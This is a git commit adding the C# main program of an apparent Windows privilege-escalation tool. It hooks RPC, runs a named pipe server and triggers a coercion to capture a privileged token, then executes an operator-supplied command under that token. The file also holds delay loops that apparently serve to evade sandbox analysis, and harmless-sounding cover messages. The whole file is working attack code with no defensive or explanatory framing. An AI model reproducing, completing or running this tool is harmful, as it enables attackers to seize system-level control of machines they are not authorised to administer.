62b27826885ccf16627e03d29f6f993619be706b
mal8bit <mal8bit.ware@gmail.com>
2025-07-15 16:36:13 +0530

    ok

---
+++ Program.cs
@@ -0,0 +1,126 @@
+﻿using System;
+using System.IO;
+using System.Diagnostics;
+using Cutexe.NativeAPI;
+using System.Security.Principal;
+using System.Threading;
+using Twokens;
+using static Cutexe.ArgsParse;
+
+namespace Cutexe
+{
+    internal class Program
+    {
+
+        class Gargs
+        {
+            [ArgsAttribute("chef","chef2",Description = "CommandLine",Required = true)]
+            public string cmd { get; set; }
+        }
+
+        public static int CountPrimes() {
+            int count = 0;
+            for (int i = 2; i < 200_0000; i++)  {
+                bool isPrime = true;
+                for (int j = 2; j <= Math.Sqrt(i); j++)
+                    if (i % j == 0) { isPrime = false; break; }
+                    if (isPrime) count++;
+            }
+            return count;
+        }
+
+        public static int SumOfSquares() {
+        int sum = 0;
+        for (int i = 1; i < 60; i++)   {
+            sum += i * i;
+            Thread.Sleep(i);
+        }
+        return sum;
+        }
+
+
+        static void Main(string[] args)
+        {
+            TextWriter ConsoleWriter = Console.Out;
+
+            Gargs pargs;
+
+            if (args.Length == 0)
+            {
+                ConsoleWriter.WriteLine("This is a restaurant , ask -chef");
+                return;
+            }
+            else
+            {
+                try
+                {
+                    pargs = ParseArgs<Gargs>(args);
+                }
+                catch (Exception e)
+                {
+                    Environment.Exit(0);
+                    if (e.InnerException != null)
+                    {
+                        e = e.InnerException;
+                    }
+                    ConsoleWriter.WriteLine("Exceptional !! ");
+                    return;
+                }
+            }
+
+            try
+            {
+
+
+                Stopwatch sw = Stopwatch.StartNew();
+
+                if(true) {
+                    // Thread.Sleep(2000);
+                    ConsoleWriter.WriteLine("Counting.....");
+                    CountPrimes();
+                    Console.WriteLine($"CountPrimes: ({sw.Elapsed})");
+                    sw.Restart();
+                    // Environment.Exit(0);
+                }
+
+                CutexeContext gpc = new CutexeContext(ConsoleWriter, Guid.NewGuid().ToString());
+
+                gpc.HookRPC();
+                ConsoleWriter.WriteLine("[*] pipe server started");
+                gpc.Start();
+                SumOfSquares();
+                Console.WriteLine($"SumOfSquares: ({sw.Elapsed})");
+                sw.Restart();
+
+                gpuTrigger uT = new gpuTrigger(gpc);
+                try
+                {
+                    int hr = uT.Trigger();
+                }
+                catch (Exception e)
+                {
+                    ConsoleWriter.WriteLine("something went wrong");
+                }
+
+
+                WindowsIdentity sysId = gpc.GetToken();
+                if (sysId != null)
+                {
+                    ConsoleWriter.WriteLine("[*] Me : " + sysId.Name);
+                    TokenuUils.createProcessReadOut(ConsoleWriter, sysId.Token, pargs.cmd);
+
+                }
+                else
+                {
+                    ConsoleWriter.WriteLine("[!] Failed to imper");
+                }
+                gpc.Restore();
+                gpc.Stop();
+            }
+            catch (Exception e)
+            {
+                ConsoleWriter.WriteLine("[!] " + e.Message);
+            }
+        }
+    }
+}
